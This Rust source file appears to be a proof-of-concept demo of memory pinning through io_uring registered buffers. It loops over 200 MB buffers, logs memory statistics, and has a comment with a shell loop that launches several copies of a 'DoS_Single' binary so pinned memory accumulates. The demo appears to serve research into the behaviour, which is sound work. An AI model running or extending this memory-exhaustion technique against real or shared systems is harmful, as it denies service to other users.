use crate::monitor;
use io_uring::IoUring;
use std::{thread, time::Duration};

pub fn demo() {
    monitor::log_memory_stats("Start");

    let mut ring = IoUring::new(8).unwrap();

    // 200 MB per iteration
    let size = 1024 * 1024 * 200;

    let mut iteration = 0;

    loop {
        iteration += 1;
        println!("=== Iteration {} ===", iteration);

        monitor::log_memory_stats("Before allocation");

        // Allocate + pin using buffer
        let (_ptr, v) = monitor::prepare_ghost_buffer(&mut ring, size, None);

        println!("Buffer allocated and pinned.");

        monitor::log_memory_stats("After pin");

        // drop buffer
        println!("Dropping buffer");
        drop(v);

        monitor::log_memory_stats("After drop");

        println!("Sleeping before next iteration\n");
        thread::sleep(Duration::from_secs(5));

        /* 
        IMPORTANT
        If we want accumulation behavior with multiple processes, 
        we need to comment this seciton out
        We can run this mutliple times by running: for i in {1..4}; do ./DoS_Single & done
        */
        println!("Unregistering buffers (releasing pinned pages)");
        ring.submitter().unregister_buffers().unwrap();

        monitor::log_memory_stats("After unregister");

        thread::sleep(Duration::from_secs(3));
    }
}